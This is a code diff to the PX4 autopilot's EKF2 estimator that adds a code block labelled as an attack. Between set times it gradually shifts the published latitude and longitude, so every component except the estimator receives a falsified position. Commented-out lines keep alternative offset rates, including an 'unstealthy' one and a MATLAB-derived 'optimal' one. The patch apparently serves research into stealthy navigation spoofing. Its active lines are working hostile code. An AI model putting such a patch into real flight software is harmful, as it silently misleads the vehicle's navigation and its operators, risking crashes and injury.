@@ -912,6 +912,44 @@ void Ekf2::task_main()
 
 				// TODO use innovatun consistency check timouts to set this
 				global_pos.dead_reckoning = false; // True if this position is estimated through dead-reckoning
+				
+				//XXX attack: insert offset seen by all components except ekf2*
+                if ((now > double(3e7)) & (now < double(11e7))) {//pick the line with the desired offset
+                    //global_pos.lat = global_pos.lat - double(1e-6*5e-6)*(now-double(3e7));//5e-6
+                    //global_pos.lat = global_pos.lat - double(1e-6*8e-6)*(now-double(3e7));//8e-6
+                    //global_pos.lat = global_pos.lat - double(1e-6*1.2e-5)*(now-double(3e7));//1.2e-5
+                    //global_pos.lat = global_pos.lat - double(1e-6*2e-5)*(now-double(3e7));//2e-5
+                    //global_pos.lat = global_pos.lat - double(1e-6*3e-5)*(now-double(3e7));//3e-5
+                    //global_pos.lat = global_pos.lat - double(1e-6*5e-5)*(now-double(3e7));//5e-5
+                    //definitely unstealthy attack
+                    //global_pos.lat = global_pos.lat - double(1e-6*1e-4)*(now-double(3e7));//1e-4
+                    //global_pos.lon = global_pos.lon - double(1e-6*1e-4)*(now-double(3e7));//1.799e-6
+                    //initial optimal attack from matlab computation
+                    //global_pos.lat = global_pos.lat - double(1e-6*1.799e-6)*(now-double(3e7));//1.799e-6
+                    //global_pos.lon = global_pos.lon - double(1e-6*2.657e-6)*(now-double(3e7));//1.799e-6
+                    //2nd version of optimal attack from matlab computation
+                    global_pos.lat = global_pos.lat - double(1e-6*3.597e-5)*(now-double(3e7));//1.799e-6
+                    global_pos.lon = global_pos.lon + double(1e-6*4.384e-5)*(now-double(3e7));//1.799e-6
+                }
+                if (now > double(11e7)) {//pick the line with the desired offset
+                    //global_pos.lat = global_pos.lat - double(1e-6*5e-6)*(now-double(3e7));//5e-6
+                    //global_pos.lat = global_pos.lat - double(1e-6*8e-6)*(now-double(3e7));//8e-6
+                    //global_pos.lat = global_pos.lat - double(1e-6*1.2e-5)*(now-double(3e7));//1.2e-5
+                    //global_pos.lat = global_pos.lat - double(1e-6*2e-5)*(now-double(3e7));//2e-5
+                    //global_pos.lat = global_pos.lat - double(1e-6*3e-5)*(now-double(3e7));//3e-5
+                    //global_pos.lat = global_pos.lat - double(1e-6*5e-5)*(now-double(3e7));//5e-5
+                    //definitely unstealthy attack
+                    //global_pos.lat = global_pos.lat - double(1e-6*1e-4)*(now-double(3e7));//1e-4
+                    //global_pos.lon = global_pos.lon - double(1e-6*1e-4)*(now-double(3e7));//1.799e-6
+                    //initial optimal attack from matlab computation
+                    //global_pos.lat = global_pos.lat - double(1e-6*1.799e-6)*(now-double(3e7));//1.799e-6
+                    //global_pos.lon = global_pos.lon - double(1e-6*2.657e-6)*(now-double(3e7));//1.799e-6
+                    //2nd version of optimal attack from matlab computation
+                    global_pos.lat = global_pos.lat - double(1e-6*3.597e-5)*double(8e7)-double(1e-6*2.968e-5)*(now-double(11e7));
+                    global_pos.lon = global_pos.lon + double(1e-6*4.384e-5)*double(8e7)+double(1e-6*5.314e-5)*(now-double(11e7));
+                }
+
+
 
 				global_pos.pressure_alt = sensors.baro_alt_meter; // Pressure altitude AMSL (m)
 
